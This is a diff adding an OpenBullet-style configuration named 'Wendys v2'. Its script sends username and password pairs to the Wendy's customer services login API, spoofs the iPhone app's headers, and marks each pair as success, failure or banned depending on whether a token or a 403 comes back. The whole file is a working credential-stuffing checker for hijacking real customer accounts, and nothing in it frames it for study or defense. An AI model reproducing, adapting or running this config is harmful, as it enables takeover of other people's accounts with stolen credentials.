@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "Wendys v2",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-10T22:06:34.1284026-05:00",
+  "AdditionalInfo": "",
+  "Author": "P6AK",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "1" 
+
+FUNCTION ToUppercase "<1>" -> VAR "2" 
+
+REQUEST POST "https://customerservices.wendys.com/CustomerServices/rest/login?lang=en&cntry=US&sourceCode=MY_WENDYS&version=7.1.3" 
+  CONTENT "{\"password\":\"<PASS>\",\"login\":\"<USER>\",\"deviceId\":\"<2>\",\"keepSignedIn\":true,\"lng\":0,\"lat\":0}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: customerservices.wendys.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Wendys/7.1.3 (iPhone; iOS 13.6; Scale/2.00)" 
+  HEADER "Accept-Language: en-US;q=1" 
+  HEADER "Content-Length: 155" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "403" 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "That didn't seem to work.  If you're having trouble logging in" 
+
